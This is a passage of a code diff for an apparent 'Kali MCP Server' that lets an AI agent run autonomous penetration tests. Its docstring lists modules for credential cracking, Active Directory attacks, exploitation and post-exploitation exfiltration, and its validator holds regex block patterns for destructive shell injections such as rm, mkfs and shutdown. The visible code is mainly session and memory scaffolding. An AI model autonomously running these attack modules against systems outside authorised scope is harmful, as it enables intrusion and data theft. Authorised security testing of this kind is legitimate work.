@@ -1,18 +1,41 @@
 #!/usr/bin/env python3
 """
-Kali MCP Server v4 - Professional Penetration Testing & Bug Bounty Platform
+Kali MCP Server v6 - Autonomous Pentest Engine
 ============================================================================
-Advanced architecture with:
-- Per-session/per-target hierarchical logging with forensic trace
-- Real-time progress feedback
-- Tool chaining & cross-referencing framework
-- CVE cartography per device with recommended patches
-- VulnX integration for advanced vulnerability correlation
-- Security-hardened input validation
-- Multi-platform bug bounty support (HackerOne, Bugcrowd, Intigriti, Immunefi)
+ARCHITECTURE: 20 Unified Mega-Modules (consolidated from 72 fragmented tools)
+
+Each module is:
+  - Parameterizable (depth: stealth/light/deep/aggressive, timeout, custom)
+  - Context-aware (auto-adapts to detected stack: Java/Go/Node/PHP/Python)
+  - Chain-capable (modules auto-trigger follow-up modules based on findings)
+  - Rate-limit aware (detects WAF/429/Cloudflare and adapts speed)
+  - Memory-persistent (retains findings across calls per target)
+
+MODULES:
+  1.  recon_engine         - Full target reconnaissance
+  2.  web_assault          - Web attack surface analysis
+  3.  injection_matrix     - All injection types unified
+  4.  credential_cracker   - Unified cracking engine (hydra+john+hashcat+markov+entropy)
+  5.  network_dominator    - Network attacks (ARP+SMB+bettercap+responder+NTLM)
+  6.  wireless_audit       - WiFi pentest (aircrack+bettercap+PMKID+WPA+monitor)
+  7.  cloud_siege          - Cloud attacks (AWS/GCS/Azure metadata+S3+SSRF chains)
+  8.  ad_annihilator       - AD attacks (bloodhound+certipy+kerberoast+secretsdump)
+  9.  api_breaker          - API exploitation (GraphQL+REST+Actuator+405 bypass)
+  10. vuln_scanner_ultra   - Vulnerability scanning (nuclei+CVE map+correlation)
+  11. exploit_engine       - Exploitation (metasploit+deser+log4shell+chains)
+  12. auth_destroyer       - Auth bypass (JWT+IDOR+CORS+creds+headers)
+  13. ssrf_hunter          - SSRF specialist (blind+DNS rebind+cloud meta+filter bypass)
+  14. crypto_forensics     - Blockchain audit (smart contracts+DeFi+tx)
+  15. osint_harvester      - OSINT (subdomains+DNS+domain intel+aggregation)
+  16. post_exploit_ops     - Post-exploitation (pivot+persist+lateral+privesc+exfil)
+  17. reporting_engine     - Reports (scope+audit+headers+PDF generation)
+  18. autopilot_commander  - Autonomous orchestration (full auto pentest)
+  19. session_ops          - Session management (start/health/summary/memory)
+  20. payload_factory      - Payloads & utilities (generators+curl+commands+wpscan)
 
 Author: Cabrel10 / MorningStar
 License: MIT
+Version: 6.0.0 - Unified Pentest Engine
 """
 
 import asyncio
@@ -33,6 +56,8 @@ import time
 import traceback
 import socket
 import threading
+import struct
+import math
 from typing import Dict, Any, Optional, List, Tuple, Callable
 from functools import wraps
 from dataclasses import dataclass, asdict, field
@@ -55,7 +80,6 @@ CHAIN_DIR = os.path.join(BASE_DIR, "chain_results")
 for d in [SESSIONS_DIR, PAYLOADS_DIR, CVE_CACHE_DIR, CHAIN_DIR]:
     os.makedirs(d, exist_ok=True)
 
-# Logging configuration
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
@@ -71,11 +95,10 @@ logger = logging.getLogger("KaliMCP")
 # ENUMS AND DATA CLASSES
 # ============================================================================
 
-class ScanIntensity(Enum):
+class ScanDepth(Enum):
     STEALTH = "stealth"
-    LOW = "low"
-    MEDIUM = "medium"
-    HIGH = "high"
+    LIGHT = "light"
+    DEEP = "deep"
     AGGRESSIVE = "aggressive"
 
 class VulnerabilityLevel(Enum):
@@ -93,7 +116,6 @@ class ToolStatus(Enum):
 
 @dataclass
 class TraceEntry:
-    """Single trace log entry for forensic audit"""
     timestamp: str
     level: str
     phase: str
@@ -102,7 +124,6 @@ class TraceEntry:
 
 @dataclass
 class ToolExecution:
-    """Complete execution record for a tool run"""
     tool_name: str
     session_id: str
     target: str
@@ -120,666 +141,1073 @@ class ToolExecution:
     command_log: List[Dict] = field(default_factory=list)
     duration_seconds: float = 0.0
 
-# ============================================================================
-# SESSION MANAGER - Hierarchical per-session/per-target logging
-# ============================================================================
-
-class SessionManager:
-    """
-    Manages pentest sessions with hierarchical storage:
-    sessions/{session_id}/{target}/{tool_name}/{execution_id}/
-        - execution.json    (full execution record)
-        - trace.jsonl       (line-by-line forensic trace)
-        - raw_output.txt    (raw command output)
-        - artifacts/        (screenshots, files, etc.)
-    """
-    
-    _instance = None
-    _lock = threading.Lock()
-    
-    def __new__(cls):
-        with cls._lock:
-            if cls._instance is None:
-                cls._instance = super().__new__(cls)
-                cls._instance._initialized = False
-            return cls._instance
-    
-    def __init__(self):
-        if self._initialized:
-            return
-        self.current_session_id = None
-        self.sessions = {}
-        self._initialized = True
-    
-    def start_session(self, name: Optional[str] = None) -> str:
-        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-        session_id = f"{name}_{ts}" if name else f"session_{ts}"
-        session_dir = os.path.join(SESSIONS_DIR, session_id)
-        os.makedirs(session_dir, exist_ok=True)
-        
-        self.current_session_id = session_id
-        self.sessions[session_id] = {
-            "id": session_id,
-            "start_time": datetime.datetime.now().isoformat(),
-            "targets": {},
-            "tool_count": 0,
-            "chain_count": 0,
-            "directory": session_dir
-        }
-        
-        # Write session manifest
-        manifest_path = os.path.join(session_dir, "session_manifest.json")
-        with open(manifest_path, 'w') as f:
-            json.dump(self.sessions[session_id], f, indent=2, default=str)
-        
-        logger.info(f"Session started: {session_id} -> {session_dir}")
-        return session_id
-    
-    def get_session_id(self) -> str:
-        if not self.current_session_id:
-            return self.start_session("auto")
-        return self.current_session_id
-    
-    def get_execution_dir(self, target: str, tool_name: str, execution_id: str) -> str:
-        session_id = self.get_session_id()
-        safe_target = sanitize_filename(target)
-        safe_tool = sanitize_filename(tool_name)
-        
-        exec_dir = os.path.join(
-            SESSIONS_DIR, session_id, safe_target, safe_tool, execution_id
-        )
-        os.makedirs(exec_dir, exist_ok=True)
-        os.makedirs(os.path.join(exec_dir, "artifacts"), exist_ok=True)
-        
-        # Track target in session
-        if session_id in self.sessions:
-            if safe_target not in self.sessions[session_id]["targets"]:
-                self.sessions[session_id]["targets"][safe_target] = []
-            self.sessions[session_id]["targets"][safe_target].append({
-                "tool": tool_name,
-                "execution_id": execution_id,
-                "timestamp": datetime.datetime.now().isoformat()
-            })
-            self.sessions[session_id]["tool_count"] += 1
-        
-        return exec_dir
-    
-    def list_session_targets(self) -> Dict:
-        session_id = self.get_session_id()
-        return self.sessions.get(session_id, {}).get("targets", {})
-
 
 # ============================================================================
-# TRACE LOGGER - Forensic-level execution tracing
-# ============================================================================
-
-class TraceLogger:
-    """
-    Records every step of tool execution as forensic proof.
-    Writes both to memory (for return) and to disk (JSONL file).
-    """
-    
-    def __init__(self, execution_dir: str, tool_name: str):
-        self.execution_dir = execution_dir
-        self.tool_name = tool_name
-        self.trace_file = os.path.join(execution_dir, "trace.jsonl")
-        self.traces = []
-        self.start_time = time.time()
-    
-    def log(self, level: str, phase: str, message: str, data: Optional[Dict] = None):
-        entry = {
-            "timestamp": datetime.datetime.now().isoformat(),
-            "elapsed_ms": round((time.time() - self.start_time) * 1000, 2),
-            "level": level,
-            "phase": phase,
-            "tool": self.tool_name,
-            "message": message,
-        }
-        if data:
-            # Truncate large data for trace
-            entry["data"] = _truncate_dict(data, max_str_len=500)
-        
-        self.traces.append(entry)
-        
-        try:
-            with open(self.trace_file, 'a') as f:
-                f.write(json.dumps(entry, default=str) + "\n")
-        except Exception as e:
-            logger.error(f"Trace write error: {e}")
-    
-    def info(self, phase: str, message: str, data: Optional[Dict] = None):
-        self.log("INFO", phase, message, data)
-    
-    def warn(self, phase: str, message: str, data: Optional[Dict] = None):
-        self.log("WARN", phase, message, data)
-    
-    def error(self, phase: str, message: str, data: Optional[Dict] = None):
-        self.log("ERROR", phase, message, data)
-    
-    def debug(self, phase: str, message: str, data: Optional[Dict] = None):
-        self.log("DEBUG", phase, message, data)
-    
-    def command(self, cmd: Any, result: Dict = None):
-        """Log a command execution with full details"""
-        if result is None:
-            result = {}
-        self.log("CMD", "command_execution", f"Executed: {cmd}", {
-            "command": str(cmd),
-            "return_code": result.get("return_code"),
-            "success": result.get("success"),
-            "execution_time": result.get("execution_time"),
-            "stdout_preview": (result.get("stdout", "") or "")[:300],
-            "stderr_preview": (result.get("stderr", "") or "")[:200]
-        })
-    
-    def get_traces(self) -> List[Dict]:
-        return self.traces
-
-
-# ============================================================================
-# PROGRESS REPORTER - Real-time progress feedback
-# ============================================================================
-
-class ProgressReporter:
-    """
-    Tracks and reports progress during tool execution.
-    Provides percentage-based progress with step descriptions.
-    """
-    
-    def __init__(self, tool_name: str, total_steps: int, trace: TraceLogger):
-        self.tool_name = tool_name
-        self.total_steps = max(total_steps, 1)
-        self.current_step = 0
-        self.steps = []
-        self.trace = trace
-    
-    def update(self, step_name: str, detail: str = ""):
-        self.current_step += 1
-        pct = min(round((self.current_step / self.total_steps) * 100, 1), 100.0)
-        step_info = {
-            "step": self.current_step,
-            "total": self.total_steps,
-            "percent": pct,
-            "name": step_name,
-            "detail": detail,
-            "timestamp": datetime.datetime.now().isoformat()
-        }
-        self.steps.append(step_info)
-        self.trace.info("progress", f"[{pct}%] {step_name}", step_info)
-        logger.info(f"[{self.tool_name}] Progress: {pct}% - {step_name}")
-    
-    def get_progress(self) -> List[Dict]:
-        return self.steps
-
-
-# ============================================================================
-# TOOL CHAINING FRAMEWORK
-# ============================================================================
-
-class ToolChainEngine:
-    """
-    Enables tools to feed results into other tools automatically.
-    Tracks cross-references and dependencies between tool outputs.
-    """
-    
-    _instance = None
-    
-    def __new__(cls):
-        if cls._instance is None:
-            cls._instance = super().__new__(cls)
-            cls._instance._initialized = False
-        return cls._instance
-    
-    def __init__(self):
-        if self._initialized:
-            return
-        self.results_store = {}  # {tool_name: {target: latest_result}}
-        self.chains = []
-        self.cross_references = defaultdict(list)
-        self._initialized = True
-    
-    def store_result(self, tool_name: str, target: str, result: Dict):
-        key = f"{tool_name}:{target}"
-        self.results_store[key] = {
-            "result": result,
-            "timestamp": datetime.datetime.now().isoformat(),
-            "tool": tool_name,
-            "target": target
-        }
-    
-    def get_result(self, tool_name: str, target: str) -> Optional[Dict]:
-        key = f"{tool_name}:{target}"
-        entry = self.results_store.get(key)
-        return entry["result"] if entry else None
-    
-    def get_related_results(self, target: str) -> Dict[str, Dict]:
-        """Get all results for a given target across tools"""
-        related = {}
-        for key, entry in self.results_store.items():
-            if entry["target"] == target or target in entry["target"]:
-                related[entry["tool"]] = entry["result"]
-        return related
-    
-    def add_cross_reference(self, from_tool: str, to_tool: str, target: str, ref_data: Dict):
-        self.cross_references[target].append({
-            "from": from_tool,
-            "to": to_tool,
-            "data": ref_data,
-            "timestamp": datetime.datetime.now().isoformat()
-        })
-    
-    def enrich_with_context(self, tool_name: str, target: str, current_result: Dict) -> Dict:
-        """Enrich current tool result with data from previous tool runs on same target"""
-        related = self.get_related_results(target)
-        if not related:
-            return current_result
-        
-        context = {}
-        
-        # Pull nmap data for service correlation
-        nmap_result = related.get("nmap_scan")
-        if nmap_result and tool_name != "nmap_scan":
-            context["known_services"] = nmap_result.get("services", [])
-            context["known_ports"] = nmap_result.get("open_ports", [])
-            context["os_detection"] = nmap_result.get("os_detection", [])
-        
-        # Pull subdomain data
-        sub_result = related.get("subdomain_scanner") or related.get("subdomain_enum")
-        if sub_result and tool_name not in ["subdomain_scanner", "subdomain_enum"]:
-            context["known_subdomains"] = sub_result.get("subdomains", [])[:20]
-        
-        # Pull tech detection
-        tech_result = related.get("web_tech_detect")
-        if tech_result and tool_name != "web_tech_detect":
-            context["known_technologies"] = tech_result.get("technologies", [])
-            context["server"] = tech_result.get("server", "")
-        
-        # Pull CVE data
-        cve_result = related.get("cve_cartography")
-        if cve_result and tool_name != "cve_cartography":
-            context["known_cves"] = cve_result.get("cves", [])[:10]
-        
-        # Pull header audit
-        hdr_result = related.get("header_security_audit")
-        if hdr_result and tool_name != "header_security_audit":
-            context["security_grade"] = hdr_result.get("grade", "")
-            context["missing_headers"] = hdr_result.get("headers_missing", [])
-        
-        if context:
-            current_result["_chain_context"] = context
-            current_result["_enriched_by"] = list(related.keys())
-        
-        return current_result
-    
-    def get_chain_summary(self, target: str) -> Dict:
-        related = self.get_related_results(target)
-        refs = self.cross_references.get(target, [])
-        return {
-            "target": target,
-            "tools_executed": list(related.keys()),
-            "cross_references": refs,
-            "total_tools": len(related)
-        }
-
-
-# ============================================================================
-# CVE CARTOGRAPHY ENGINE
-# ============================================================================
-
-class CVECartographer:
-    """
-    Maps discovered services to known CVEs with severity and patch info.
-    Uses NVD API and local cache for performance.
-    """
-    
-    # Curated CVE database for common services (offline fallback)
-    KNOWN_CVES = {
-        "apache": {
-            "2.4.49": [
-                {"cve": "CVE-2021-41773", "severity": "critical", "cvss": 9.8,
-                 "description": "Path traversal and RCE in Apache HTTP Server 2.4.49",
-                 "patch": "Upgrade to Apache 2.4.51+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"]},
-                {"cve": "CVE-2021-42013", "severity": "critical", "cvss": 9.8,
-                 "description": "Path traversal bypass of CVE-2021-41773 fix",
-                 "patch": "Upgrade to Apache 2.4.51+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"]}
-            ],
-            "2.4.50": [
-                {"cve": "CVE-2021-42013", "severity": "critical", "cvss": 9.8,
-                 "description": "Incomplete fix for path traversal in 2.4.50",
-                 "patch": "Upgrade to Apache 2.4.51+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"]}
-            ],
-            "2.4": [
-                {"cve": "CVE-2023-25690", "severity": "critical", "cvss": 9.8,
-                 "description": "HTTP request smuggling via mod_proxy",
-                 "patch": "Upgrade to Apache 2.4.56+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-25690"]},
-                {"cve": "CVE-2023-43622", "severity": "high", "cvss": 7.5,
-                 "description": "HTTP/2 DoS via zero-length headers",
-                 "patch": "Upgrade to Apache 2.4.58+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-43622"]}
-            ]
-        },
-        "nginx": {
-            "1.": [
-                {"cve": "CVE-2021-23017", "severity": "critical", "cvss": 9.4,
-                 "description": "DNS resolver off-by-one heap write",
-                 "patch": "Upgrade to nginx 1.21.0+ / 1.20.1+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2021-23017"]},
-                {"cve": "CVE-2022-41741", "severity": "high", "cvss": 7.8,
-                 "description": "Memory corruption in mp4 module",
-                 "patch": "Upgrade to nginx 1.23.2+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2022-41741"]}
-            ]
-        },
-        "openssh": {
-            "8.": [
-                {"cve": "CVE-2023-38408", "severity": "critical", "cvss": 9.8,
-                 "description": "Remote code execution via ssh-agent forwarding",
-                 "patch": "Upgrade to OpenSSH 9.3p2+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-38408"]}
-            ],
-            "9.": [
-                {"cve": "CVE-2024-6387", "severity": "critical", "cvss": 8.1,
-                 "description": "RegreSSHion: RCE via race condition in signal handler",
-                 "patch": "Upgrade to OpenSSH 9.8+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-6387"]}
-            ]
-        },
-        "mysql": {
-            "5.": [
-                {"cve": "CVE-2023-22008", "severity": "medium", "cvss": 4.9,
-                 "description": "MySQL Server InnoDB vulnerability",
-                 "patch": "Upgrade to MySQL 8.0.34+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-22008"]}
-            ],
-            "8.": [
-                {"cve": "CVE-2024-20960", "severity": "medium", "cvss": 6.5,
-                 "description": "MySQL Server optimizer vulnerability",
-                 "patch": "Apply Oracle Critical Patch Update",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-20960"]}
-            ]
-        },
-        "vsftp": {
-            "2.3.4": [
-                {"cve": "CVE-2011-2523", "severity": "critical", "cvss": 10.0,
-                 "description": "vsftpd 2.3.4 backdoor command execution",
-                 "patch": "Upgrade to vsftpd 3.0+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2011-2523"]}
-            ]
-        },
-        "proftpd": {
-            "1.3": [
-                {"cve": "CVE-2019-12815", "severity": "critical", "cvss": 9.8,
-                 "description": "Arbitrary file copy via mod_copy",
-                 "patch": "Upgrade to ProFTPD 1.3.6+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-12815"]}
-            ]
-        },
-        "iis": {
-            "10.": [
-                {"cve": "CVE-2023-36899", "severity": "high", "cvss": 7.5,
-                 "description": "ASP.NET elevation of privilege",
-                 "patch": "Apply latest Windows security updates",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-36899"]}
-            ]
-        },
-        "php": {
-            "8.": [
-                {"cve": "CVE-2024-4577", "severity": "critical", "cvss": 9.8,
-                 "description": "CGI argument injection on Windows",
-                 "patch": "Upgrade to PHP 8.3.8+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-4577"]}
-            ],
-            "7.": [
-                {"cve": "CVE-2019-11043", "severity": "critical", "cvss": 9.8,
-                 "description": "Remote code execution via fastcgi",
-                 "patch": "Upgrade to PHP 7.4+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2019-11043"]}
-            ]
-        },
-        "wordpress": {
-            "": [
-                {"cve": "CVE-2023-2982", "severity": "critical", "cvss": 9.8,
-                 "description": "Authentication bypass in Social Login plugin",
-                 "patch": "Update WordPress and all plugins",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-2982"]}
-            ]
-        },
-        "tomcat": {
-            "9.": [
-                {"cve": "CVE-2024-23672", "severity": "high", "cvss": 7.5,
-                 "description": "DoS via WebSocket connection",
-                 "patch": "Upgrade to Tomcat 9.0.86+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-23672"]}
-            ],
-            "10.": [
-                {"cve": "CVE-2024-24549", "severity": "high", "cvss": 7.5,
-                 "description": "HTTP/2 header handling DoS",
-                 "patch": "Upgrade to Tomcat 10.1.19+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2024-24549"]}
-            ]
-        },
-        "samba": {
-            "4.": [
-                {"cve": "CVE-2023-3961", "severity": "critical", "cvss": 9.1,
-                 "description": "Path traversal in Samba shares",
-                 "patch": "Upgrade to Samba 4.19.1+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-3961"]}
-            ]
-        },
-        "redis": {
-            "": [
-                {"cve": "CVE-2023-41056", "severity": "high", "cvss": 8.1,
-                 "description": "Heap overflow in Redis",
-                 "patch": "Upgrade to Redis 7.2.4+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-41056"]}
-            ]
-        },
-        "elasticsearch": {
-            "7.": [
-                {"cve": "CVE-2023-31419", "severity": "high", "cvss": 7.5,
-                 "description": "Stack overflow in search API",
-                 "patch": "Upgrade to Elasticsearch 7.17.14+",
-                 "references": ["https://nvd.nist.gov/vuln/detail/CVE-2023-31419"]}
-            ]
-        }
-    }
-    
-    @classmethod
-    def lookup_cves(cls, product: str, version: str) -> List[Dict]:
-        """Look up CVEs for a product+version from local database"""
-        product_lower = (product or "").lower()
-        version_str = version or ""
-        
-        results = []
-        for known_product, versions in cls.KNOWN_CVES.items():
-            if known_product in product_lower:
-                for ver_prefix, cves in versions.items():
-                    if ver_prefix == "" or version_str.startswith(ver_prefix):
-                        results.extend(cves)
-        
-        return results
-    
-    @classmethod
-    def lookup_cves_online(cls, product: str, version: str) -> List[Dict]:
-        """Query NVD API for CVEs (with fallback to local)"""
-        local = cls.lookup_cves(product, version)
-        
-        # Try NVD API
-        try:
-            keyword = f"{product} {version}".strip()
-            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={urllib.parse.quote(keyword)}&resultsPerPage=5"
-            
-            result = subprocess.run(
-                ["curl", "-s", "--max-time", "10", url],
-                capture_output=True, text=True, timeout=15
-            )
-            
-            if result.returncode == 0 and result.stdout:
-                data = json.loads(result.stdout)
-                for vuln in data.get("vulnerabilities", [])[:5]:
-                    cve_data = vuln.get("cve", {})
-                    cve_id = cve_data.get("id", "")
-                    
-                    # Skip if already in local results
-                    if any(l["cve"] == cve_id for l in local):
-                        continue
-                    
-                    desc_list = cve_data.get("descriptions", [])
-                    desc = next((d["value"] for d in desc_list if d.get("lang") == "en"), "")
-                    
-                    metrics = cve_data.get("metrics", {})
-                    cvss_data = metrics.get("cvssMetricV31", [{}])
-                    cvss_score = cvss_data[0].get("cvssData", {}).get("baseScore", 0) if cvss_data else 0
-                    
-                    severity = "info"
-                    if cvss_score >= 9.0: severity = "critical"
-                    elif cvss_score >= 7.0: severity = "high"
-                    elif cvss_score >= 4.0: severity = "medium"
-                    elif cvss_score > 0: severity = "low"
-                    
-                    local.append({
-                        "cve": cve_id,
-                        "severity": severity,
-                        "cvss": cvss_score,
-                        "description": desc[:300],
-                        "patch": "Check vendor advisories",
-                        "references": [f"https://nvd.nist.gov/vuln/detail/{cve_id}"],
-                        "source": "nvd_api"
-                    })
-        except Exception as e:
-            logger.debug(f"NVD API lookup failed: {e}")
-        
-        return local
-    
-    @classmethod
-    def map_services_to_cves(cls, services: List[Dict], use_online: bool = False) -> Dict:
-        """Map a list of discovered services to CVEs"""
-        cartography = {
-            "devices": [],
-            "total_cves": 0,
-            "critical_count": 0,
-            "high_count": 0,
-            "medium_count": 0
-        }
-        
-        for svc in services:
-            product = svc.get("product", "") or svc.get("service", "")
-            version = svc.get("version", "") or ""
-            port = svc.get("port", "")
-            
-            if use_online:
-                cves = cls.lookup_cves_online(product, version)
-            else:
-                cves = cls.lookup_cves(product, version)
-            
-            device_entry = {
-                "port": port,
-                "service": svc.get("service", ""),
-                "product": product,
-                "version": version,
-                "cves": cves,
-                "cve_count": len(cves),
-                "max_severity": max((c["severity"] for c in cves), default="none",
-                                     key=lambda s: {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}.get(s, 0)),
-                "patches_recommended": list(set(c.get("patch", "") for c in cves if c.get("patch")))
-            }
-            
-            cartography["devices"].append(device_entry)
-            cartography["total_cves"] += len(cves)
-            cartography["critical_count"] += sum(1 for c in cves if c["severity"] == "critical")
-            cartography["high_count"] += sum(1 for c in cves if c["severity"] == "high")
-            cartography["medium_count"] += sum(1 for c in cves if c["severity"] == "medium")
-        
-        return cartography
-
-
-# ============================================================================
-# SECURITY HARDENING - Input validation for MCP server itself
+# INPUT VALIDATOR
 # ============================================================================
 
 class InputValidator:
-    """Validates and sanitizes all tool inputs to prevent injection attacks"""
-    
-    # Characters that could be dangerous in shell commands
-    DANGEROUS_CHARS = ['`', '$', '|', ';', '&', '>', '<', '\n', '\r']
-    
-    # Allowed characters for targets (domains, IPs, URLs)
-    TARGET_PATTERN = re.compile(r'^[a-zA-Z0-9\.\-\_\:\/\?\=\&\%\#\@\[\]]+$')
-    
-    # IP address pattern
-    IP_PATTERN = re.compile(r'^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$')
-    
-    # Domain pattern
-    DOMAIN_PATTERN = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$')
-    
+    DANGEROUS_CHARS = ["`", "$", "|", ";", "&", ">", "<", "\n", "\r"]
+    TARGET_PATTERN = re.compile(r"^[a-zA-Z0-9.\-_:/?=&%#@\[\]]+$")
+    IP_PATTERN = re.compile(r"^(\d{1,3}\.){3}\d{1,3}(/\d{1,2})?$")
+    DOMAIN_PATTERN = re.compile(
+        r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?"
+        r"(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$"
+    )
+
     @classmethod
     def sanitize_target(cls, target: str) -> str:
-        """Sanitize a target string, removing dangerous characters"""
         if not target:
             raise ValueError("Target cannot be empty")
-        
-        # Remove null bytes
-        target = target.replace('\x00', '')
-        
-        # Check for obvious injection attempts
+        target = target.replace("\x00", "")
         injection_patterns = [
-            r';\s*rm\s', r';\s*dd\s', r';\s*mkfs',
-            r'\$\(', r'`.*`', r'\|\|.*rm',
-            r'>\s*/dev/', r';\s*shutdown', r';\s*reboot'
+            r";\s*rm\s", r";\s*dd\s", r";\s*mkfs",
+            r"\$\(", r"`.*`", r"\|\|.*rm",
+            r">\s*/dev/", r";\s*shutdown", r";\s*reboot",
         ]
         for pattern in injection_patterns:
             if re.search(pattern, target, re.IGNORECASE):
-                raise ValueError(f"Potentially dangerous input detected in target: {target[:50]}")
-        
+                raise ValueError(f"Dangerous input detected: {target[:50]}")
         return target.strip()
-    
+
     @classmethod
     def validate_command_args(cls, args: List[str]) -> List[str]:
-        """Validate command arguments are safe"""
         validated = []
         for arg in args:
             if isinstance(arg, str):
-                # Block embedded shell commands
-                if any(c in arg for c in ['`', '$(', '${']) and not arg.startswith('-'):
-                    raise ValueError(f"Shell metacharacter in argument: {arg[:50]}")
+                if any(c in arg for c in ["`", "$(", "${"]) and not arg.startswith("-"):
+                    raise ValueError(f"Shell metachar in argument: {arg[:50]}")
                 validated.append(arg)
             else:
                 validated.append(str(arg))
         return validated
-    
-    @classmethod
-    def validate_file_path(cls, path: str) -> str:
-        """Ensure path doesn't traverse outside allowed directories"""
-        if not path:
-            raise ValueError("Path cannot be empty")
-        
-        # Normalize
-        normalized = os.path.normpath(path)
-        
-        # Block traversal
-        if '..' in normalized:
-            raise ValueError(f"Path traversal detected: {path}")
-        
-        return normalized
-    
-    @classmethod
-    def validate_port(cls, port: int) -> int:
-        """Validate port number"""
-        if not isinstance(port, int) or port < 1 or port > 65535:
-            raise ValueError(f"Invalid port: {port}")
-        return port
-    
+
     @classmethod
     def validate_timeout(cls, timeout: int, max_timeout: int = 7200) -> int:
-        """Validate timeout value"""
         if not isinstance(timeout, (int, float)) or timeout < 1 or timeout > max_timeout:
             return min(max(int(timeout), 1), max_timeout)
         return int(timeout)
 
+    @classmethod
+    def validate_port(cls, port: int) -> int:
+        if not isinstance(port, int) or port < 1 or port > 65535:
+            raise ValueError(f"Invalid port: {port}")
+        return port
+
+
+# ============================================================================
+# SESSION MANAGER
+# ============================================================================
+
+class SessionManager:
+    def __init__(self):
+        self.current_session_id = None
+        self.sessions = {}
+        self.executions = {}
+
+    def create_session(self, name: Optional[str] = None) -> str:
+        session_id = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
+        session_dir = os.path.join(SESSIONS_DIR, session_id)
+        os.makedirs(session_dir, exist_ok=True)
+        self.current_session_id = session_id
+        self.sessions[session_id] = {
+            "id": session_id,
+            "name": name or session_id,
+            "created": datetime.datetime.now().isoformat(),
+            "executions": [],
+        }
+        meta_path = os.path.join(session_dir, "session_meta.json")
+        with open(meta_path, "w") as f:
+            json.dump(self.sessions[session_id], f, indent=2)
+        return session_id
+
+    def get_session_id(self) -> str:
+        if not self.current_session_id:
+            self.create_session("auto_session")
+        return self.current_session_id
+
+    def start_execution(self, tool_name: str, target: str, inputs: Dict) -> ToolExecution:
+        session_id = self.get_session_id()
+        execution_id = f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:8]}"
+        safe_target = re.sub(r"[^\w.\-]", "_", target.replace("://", "_"))[:100]
+        exec_dir = os.path.join(SESSIONS_DIR, session_id, safe_target, tool_name, execution_id)
+        os.makedirs(exec_dir, exist_ok=True)
+        execution = ToolExecution(
+            tool_name=tool_name,
+            session_id=session_id,
+            target=target,
+            execution_id=execution_id,
+            start_time=datetime.datetime.now().isoformat(),
+            inputs=inputs,
+        )
+        self.executions[execution_id] = execution
+        return execution
+
+    def complete_execution(self, execution: ToolExecution, outputs: Dict, status: str = "completed"):
+        execution.end_time = datetime.datetime.now().isoformat()
+        execution.status = status
+        execution.outputs = outputs
+        start = datetime.datetime.fromisoformat(execution.start_time)
+        end = datetime.datetime.fromisoformat(execution.end_time)
+        execution.duration_seconds = (end - start).total_seconds()
+        safe_target = re.sub(r"[^\w.\-]", "_", execution.target.replace("://", "_"))[:100]
+        exec_dir = os.path.join(
+            SESSIONS_DIR, execution.session_id, safe_target,
+            execution.tool_name, execution.execution_id,
+        )
+        os.makedirs(exec_dir, exist_ok=True)
+        trace_path = os.path.join(exec_dir, "trace.jsonl")
+        with open(trace_path, "a") as f:
+            record = {
+                "execution_id": execution.execution_id,
+                "tool": execution.tool_name,
+                "target": execution.target,
+                "status": execution.status,
+                "duration": execution.duration_seconds,
+                "start": execution.start_time,
+                "end": execution.end_time,
+                "inputs": {k: str(v)[:200] for k, v in execution.inputs.items()},
+                "output_summary": str(outputs)[:500] if outputs else "",
+            }
+            f.write(json.dumps(record) + "\n")
+
+
+# ============================================================================
+# PENTEST MEMORY - Contextual memory across tool calls
+# ============================================================================
+
+class PentestMemory:
+    def __init__(self):
+        self._findings = defaultdict(lambda: defaultdict(list))
+        self._decisions = defaultdict(list)
+        self._context = defaultdict(dict)
+        self._tech_stack = defaultdict(dict)
+
+    def store_finding(self, target: str, tool: str, finding_type: str, data: Dict):
+        entry = {
+            "timestamp": datetime.datetime.now().isoformat(),
+            "tool": tool,
+            "type": finding_type,
+            "data": data,
+        }
+        self._findings[target][finding_type].append(entry)
+        logger.info(f"[MEMORY] Stored {finding_type} for {target} from {tool}")
+
+    def store_tech(self, target: str, tech_data: Dict):
+        self._tech_stack[target].update(tech_data)
+
+    def get_tech(self, target: str) -> Dict:
+        return dict(self._tech_stack.get(target, {}))
+
+    def get_context(self, target: str) -> Dict:
+        findings = self._findings.get(target, {})
+        return {
+            "target": target,
